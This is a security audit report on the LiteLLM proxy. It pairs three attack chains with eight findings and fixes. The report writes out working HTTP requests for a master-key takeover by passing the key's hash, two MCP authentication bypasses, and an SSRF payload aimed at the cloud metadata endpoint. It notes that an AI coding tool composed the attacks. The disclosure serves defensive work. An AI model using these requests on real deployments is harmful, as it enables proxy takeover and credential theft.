# LiteLLM Proxy — Security Audit Report

**Date:** 2026-04-21
**Target:** LiteLLM proxy server, commit `b9bedc8153` on `litellm_internal_staging`
**Method:** Source code audit with end-to-end execution path tracing, targeted runtime verification, and automated PoC tests (32 tests, all passing)
**Auditors:** Independent security research
**Methodology:** AutoFyn for finding vulnerabilities, and Claude Code for composition into real attacks.
**Live reproduction:** `live_exploit_tests.py` (see [Reproduction](#reproduction) section)

---


## Attack Chain 1: Any Authenticated User to Full Proxy Takeover

**Severity:** Critical
**Precondition:** Any valid LiteLLM API key (including lowest-privilege `INTERNAL_USER`)
**Result:** Attacker rotates the master key and gains full administrative control
**Vulnerabilities used:** F-4, F-5

### Step 1 — Dump all API key rows

Any authenticated user, including `INTERNAL_USER`, can call `GET /spend/keys`. The handler fetches every key in the database with no caller-scoped filtering:

```python
# litellm/proxy/spend_tracking/spend_management_endpoints.py:52
key_info = await prisma_client.get_data(table_name="key", query_type="find_all")
return key_info
```

The function signature has no `user_api_key_dict` parameter, so per-caller filtering is structurally impossible. The response includes every key row: token hashes, user IDs, team IDs, budgets, metadata. Among these rows is the master key's SHA-256 hash.

> **Why the master key hash is present:** LiteLLM stores the master key hash in the `LiteLLM_VerificationToken` table for spend tracking. The codebase contains `disable_master_key_return` and `disable_adding_master_key_hash_to_db` flags, confirming this is a known deployment concern — but both are off by default.

```
GET /spend/keys HTTP/1.1
Authorization: Bearer sk-low-privilege-user-key
```

**Response contains:**
```json
[
  {"token": "sha256:abc123...", "key_alias": "master-key", "spend": 0.0, ...},
  {"token": "sha256:def456...", "key_alias": "team-a-key", "spend": 12.50, ...},
  ...
]
```

### Step 2 — Rotate the master key using its hash

The attacker calls `POST /key/regenerate`, authenticating with their own low-privilege key but passing the master key's hash as the `key` parameter in the request body.

Inside the handler, `_is_master_key()` accepts both the plaintext master key and its hash:

```python
# litellm/proxy/spend_tracking/spend_tracking_utils.py:55-69
def _is_master_key(api_key, _master_key):
    is_master_key = secrets.compare_digest(api_key, _master_key)
    if is_master_key:
        return True
    # This branch treats the hash as equivalent to the key itself
    is_master_key = secrets.compare_digest(api_key, hash_token(_master_key))
    if is_master_key:
        return True
    return False
```

The `/key/regenerate` handler calls `_is_master_key(api_key=data.key, ...)` on the request body value — not on the `Authorization` header. When it returns `True`, the endpoint rotates the master key to the attacker's chosen value.

```
POST /key/regenerate HTTP/1.1
Authorization: Bearer sk-low-privilege-user-key
Content-Type: application/json

{
  "key": "sha256:abc123...",
  "new_master_key": "sk-attacker-now-owns-this-proxy"
}
```

**Result:** The master key is rotated. The attacker has full admin access. The original admin is locked out.

### Why this works

- `/spend/keys` requires authentication but has no role check — `INTERNAL_USER` can reach it through the `spend_tracking_routes` allowlist
- `_is_master_key()` was written to recognize the hash for spend-tracking purposes, but is also called in the key regeneration path, creating a privilege escalation bridge
- `/key/regenerate` validates the `Authorization` header (requiring any valid key) but trusts the `data.key` body parameter through `_is_master_key()` without requiring that the caller actually possesses the plaintext master key

---

## Attack Chain 2: Unauthenticated Anonymous MCP Access

**Severity:** High
**Precondition:** Network access to the proxy (no credentials)
**Result:** Anonymous access to MCP servers configured with `allow_all_keys: true`
**Vulnerabilities used:** F-1, F-2

Two independent bypasses achieve the same result. Either one is sufficient.

### Path A — Query string injection

The MCP auth handler skips authentication when the URL contains `.well-known`:

```python
# litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py:120
if ".well-known" in str(request.url):  # public routes
    validated_user_api_key_auth = UserAPIKeyAuth()
```

`str(request.url)` includes the query string. Appending `?x=.well-known` to any MCP endpoint matches the check:

```
GET /v1/mcp/tools?x=.well-known HTTP/1.1
Host: target-proxy:4000
(no auth headers)
```

Authentication is skipped entirely. The caller receives an empty `UserAPIKeyAuth()`.

### Path B — Invalid bearer token fallback

When a request carries an `Authorization` header but no `x-litellm-api-key`, the MCP auth handler tries to validate it as a LiteLLM key. If validation fails with 401 or 403, the exception is silently swallowed:

```python
# user_api_key_auth_mcp.py:136-142
except HTTPException as e:
    if e.status_code in (401, 403):
        validated_user_api_key_auth = UserAPIKeyAuth()  # anonymous
```

```
GET /v1/mcp/tools HTTP/1.1
Authorization: Bearer totally-invalid-garbage
```

The invalid key triggers a 401, which is caught, and the caller gets anonymous access.

### Why neither bypass is caught downstream

Route checks explicitly skip authorization for MCP routes:

```python
# litellm/proxy/auth/route_checks.py:231-232
elif route.startswith("/v1/mcp/") or route.startswith("/mcp-rest/"):
    pass  # authN/authZ handled by api itself
```

The anonymous `UserAPIKeyAuth()` identity has no key, no user, no team. The MCP server manager resolves this to an empty `allowed_mcp_servers` set — **except** for servers configured with `allow_all_keys: true`, which are added unconditionally regardless of caller identity.

### Scope of impact

This does **not** grant access to all MCP servers. Only servers with `allow_all_keys: true` (or equivalent anonymous-compatible configuration) are reachable. But for deployments that use this flag, the bypass gives full unauthenticated access to list tools, call tools, and access resources on those servers.

---

## Attack Chain 3: SSRF via Poisoned MCP OAuth Discovery

**Severity:** High
**Precondition:** Attacker can register an MCP server (requires `PROXY_ADMIN`) or can control the HTTP response of an already-registered OAuth2 MCP server (e.g., DNS hijack, compromised upstream)
**Result:** Proxy fetches attacker-controlled internal URLs; response data exfiltrated through the public `/token` endpoint
**Vulnerabilities used:** F-6, F-7

### Step 1 — Poison OAuth discovery metadata

When LiteLLM connects to an OAuth2-enabled MCP server, it follows RFC 9728 to discover the authorization server. A malicious server returns:

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer resource_metadata="http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

The proxy parses the `resource_metadata` URL from the header and fetches it with no validation:

```python
# litellm/proxy/_experimental/mcp_server/mcp_server_manager.py:1593
response = await client.get(resource_metadata_url)  # no SSRF protection
```

No private IP blocklist. No scheme allowlist. The proxy will reach `169.254.169.254`, `10.x.x.x`, `127.0.0.1`, or any other internal address. The fetched response is parsed for `authorization_servers`, which triggers a second hop — `_fetch_single_authorization_server_metadata()` — also with no validation.

The discovered `token_endpoint` URL is stored on the `MCPServer` object.

### Step 2 — Exfiltrate via the public `/token` endpoint

The `/token` route has no authentication dependency:

```python
# litellm/proxy/_experimental/mcp_server/discoverable_endpoints.py:589
@router.post("/{mcp_server_name}/token")
@router.post("/token")
async def token_endpoint(request: Request, ...):  # no Depends(user_api_key_auth)
```

An unauthenticated caller can trigger a POST to the stored `token_url` (now pointing at an internal service). The `access_token` field from the response is returned to the caller, providing a data exfiltration channel.

### Scope of impact

The SSRF is blind for the initial discovery fetches (response is parsed, not returned raw). But the `/token` relay returns the upstream response's `access_token`, `token_type`, `expires_in`, and `refresh_token` fields, enabling partial exfiltration. In cloud environments, this can reach the instance metadata service and leak IAM credentials.

The main limiting factor is that MCP server registration requires `PROXY_ADMIN`. This is not a zero-precondition internet attack — but in scenarios where the attacker can influence an MCP server's HTTP responses (compromised upstream, DNS poisoning, MITM on non-TLS MCP server URLs), the SSRF is reachable without admin credentials.

---

## Individual Findings

### F-1: MCP `.well-known` Query-String Auth Bypass

| Field | Value |
|---|---|
| **Severity** | Critical |
| **Category** | Authentication Bypass |
| **CWE** | CWE-287 |
| **File** | `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py:120` |
| **Used in** | Chain 2 |

**Root cause:** `".well-known" in str(request.url)` matches query parameters, not just path segments.

**Fix:** Replace with `request.url.path.startswith("/.well-known")`.

---

### F-2: MCP OAuth2 Fallback Grants Anonymous Access

| Field | Value |
|---|---|
| **Severity** | Critical |
| **Category** | Authentication Bypass |
| **CWE** | CWE-287 |
| **Files** | `user_api_key_auth_mcp.py:127-153`, `route_checks.py:231-232` |
| **Used in** | Chain 2 |

**Root cause:** `except HTTPException` / `except ProxyException` blocks catch auth failures and return `UserAPIKeyAuth()` instead of propagating. Route checks have a blanket `pass` for `/v1/mcp/*`.

**Fix:** Remove the exception-swallowing blocks. Propagate auth failures. Add explicit authorization for MCP routes in `route_checks.py`.

---

### F-3: Unauthenticated `/debug/asyncio-tasks`

| Field | Value |
|---|---|
| **Severity** | Low |
| **Category** | Information Disclosure |
| **CWE** | CWE-306 |
| **File** | `litellm/proxy/common_utils/debug_utils.py:53` |

**Root cause:** Route registered with `@router.get("/debug/asyncio-tasks")` and no auth dependency. Compare with `/memory-usage-in-mem-cache` in the same file, which correctly uses `Depends(user_api_key_auth)`.

**Disclosed information:** Active coroutine names and counts (reveals proxy internals: Redis usage, provider names, logging pipeline).

**Fix:** Add `dependencies=[Depends(user_api_key_auth)]` to the route decorator.

---

### F-4: `/spend/keys` Returns All Key Rows to Any Authenticated User

| Field | Value |
|---|---|
| **Severity** | High |
| **Category** | Broken Access Control |
| **CWE** | CWE-200 |
| **File** | `litellm/proxy/spend_tracking/spend_management_endpoints.py:34-66` |
| **Used in** | Chain 1 (Step 1) |

**Root cause:** `spend_key_fn()` has no `user_api_key_dict` parameter — caller identity is structurally unavailable. Calls `get_data(table_name="key", query_type="find_all")` with no filtering. The route is accessible to `INTERNAL_USER` through `spend_tracking_routes`.

**Disclosed information:** All key rows including token hashes, user IDs, team IDs, budgets, metadata, and the master key hash.

**Fix:** Add `user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth)` parameter. Filter by role: admins see all, others see only their own keys.

---

### F-5: Pass-the-Hash on Master Key in `/key/regenerate`

| Field | Value |
|---|---|
| **Severity** | Critical |
| **Category** | Privilege Escalation |
| **CWE** | CWE-836 |
| **Files** | `spend_tracking_utils.py:55-69`, `key_management_endpoints.py:3919` |
| **Used in** | Chain 1 (Step 2) |

**Root cause:** `_is_master_key()` compares the input against both `_master_key` (plaintext) and `hash_token(_master_key)` (SHA-256 hash). The hash comparison was added for spend tracking but is also reachable through the `/key/regenerate` handler, which checks `_is_master_key(api_key=data.key, ...)` on the request body.

**Fix:** Remove the hash comparison branch from `_is_master_key()`. If hash comparison is needed for spend tracking, use a separate function that is never called from privilege-sensitive paths.

---

### F-6: MCP OAuth Metadata SSRF

| Field | Value |
|---|---|
| **Severity** | High |
| **Category** | Server-Side Request Forgery |
| **CWE** | CWE-918 |
| **File** | `litellm/proxy/_experimental/mcp_server/mcp_server_manager.py:1580-1687` |
| **Used in** | Chain 3 (Step 1) |

**Root cause:** `_fetch_oauth_metadata_from_resource()` and `_fetch_single_authorization_server_metadata()` fetch attacker-influenced URLs with no private IP blocking or scheme validation. `IPAddressUtils` exists elsewhere in the codebase but is not applied here.

**Fix:** Validate all fetched URLs against a private IP blocklist and restrict to `https://` scheme.

---

### F-7: Unauthenticated `/token` Enables SSRF Data Exfiltration

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Category** | SSRF Amplifier |
| **CWE** | CWE-918 |
| **File** | `litellm/proxy/_experimental/mcp_server/discoverable_endpoints.py:589-636` |
| **Used in** | Chain 3 (Step 2) |

**Root cause:** The `/token` endpoint is intentionally unauthenticated (standard for OAuth token exchange). However, it POSTs to the stored `token_url` with no SSRF validation, and returns `access_token` / `refresh_token` fields from the response. When combined with F-6 (which can poison `token_url` to point at internal services), this creates a data exfiltration channel.

**Note:** This is not a standalone auth bug — public `/token` is expected for OAuth flows. The issue is the lack of SSRF validation on the outbound request.

**Fix:** Add URL validation to `exchange_token_with_server()`. Block requests to private IP ranges and cloud metadata endpoints.

---

### F-8: `/metrics` Unauthenticated by Default with Sensitive Labels

| Field | Value |
|---|---|
| **Severity** | Medium (conditional) |
| **Category** | Insecure Default |
| **CWE** | CWE-306, CWE-359 |
| **Files** | `litellm/integrations/prometheus.py:3477`, `litellm/proxy/middleware/prometheus_auth_middleware.py:22` |

**Condition:** Prometheus logging is enabled and `require_auth_for_metrics_endpoint` is not set to `true` (the default).

**Root cause:** `/metrics` is mounted as a separate ASGI app with no auth. The `PrometheusAuthMiddleware` only activates when `require_auth_for_metrics_endpoint` is explicitly enabled. Default metric labels include `hashed_api_key`, `api_key_alias`, `user_email`, `client_ip`, and `user_agent`.

**Fix:** Change the default to require authentication for `/metrics`, or strip PII labels by default.

---

## Appendix: Claims Not Confirmed as Externally Exploitable

These were claimed in the original `summary.md` but did not survive end-to-end verification.

### `/user/info` v1 IDOR (originally claimed as P2 High)

The v1 handler does not locally check caller vs. target `user_id`. However, the upstream auth layer in `route_checks.py:172-184` enforces this check before the handler runs. Runtime verification confirmed that an `INTERNAL_USER` requesting another user's info receives a `403`:

```
HTTPException 403: key not allowed to access this user's info.
user_id=victim-user, key's user_id=attacker-user
```

The PoC tests this by calling the handler directly, bypassing the real auth stack.

### `/global/spend/reset` missing admin gate (originally claimed as P2 Critical)

The handler lacks a local role check, but `/global/spend/reset` is listed in `master_key_only_routes` (`_types.py:509`). The auth layer rejects non-master-key callers at `user_api_key_auth.py:1159` before the handler executes.

### Login cookies missing security flags (originally claimed as P1 High)

The `set_cookie` calls lack `httponly`, `secure`, and `samesite` flags. However, the JWT is also intentionally returned in the JSON response body for frontend JS access — the cookie is not the sole session transport. This is a hardening gap, not a standalone exploitable vulnerability.

### Unauthenticated `/token` as standalone auth bug (originally claimed as P1 High)

Public `/token` is standard for OAuth token exchange flows. It is only security-relevant as an SSRF amplifier when combined with F-6. Reported as F-7 in that context, not as a standalone finding.

---

## Reproduction

### Option 1: Live integration tests (recommended)

These hit a real running LiteLLM proxy — no mocks, no fakes.

```bash
# Terminal 1: start a local proxy
LITELLM_MASTER_KEY=sk-test-master-key-1234 \
litellm --config tests/test_litellm/proxy/security_poc/live_test_config.yaml \
        --port 14000

# Terminal 2: run live exploit tests
python tests/test_litellm/proxy/security_poc/live_exploit_tests.py

# Or with pytest (skips automatically if proxy is not running):
python -m pytest tests/test_litellm/proxy/security_poc/live_exploit_tests.py -v
```

The script creates its own low-privilege test key, then confirms each finding and attack chain against the real HTTP stack. Exit code 1 = vulnerabilities found.

### Option 2: Unit-level PoC tests (no proxy needed)

```bash
python -m pytest tests/test_litellm/proxy/security_poc/test_auth_bypass_poc.py -v
```

These are self-contained and run in ~1.5 seconds, but exercise handlers in isolation (some bypass upstream auth guards — see Appendix for which claims this affects).

---

## Recommended Fix Priority

| Priority | Finding | Fix Effort |
|---|---|---|
| **Immediate** | F-5: Remove hash branch from `_is_master_key()` | Small |
| **Immediate** | F-4: Add caller filtering to `/spend/keys` | Small |
| **Immediate** | F-1: Fix `.well-known` check to use `request.url.path` | Trivial |
| **Immediate** | F-2: Remove exception-swallowing in MCP auth | Small |
| **High** | F-6: Add SSRF validation to MCP OAuth discovery | Medium |
| **High** | F-7: Add SSRF validation to `/token` relay | Medium |
| **Standard** | F-3: Add auth to `/debug/asyncio-tasks` | Trivial |
| **Standard** | F-8: Default `/metrics` to require auth | Small |
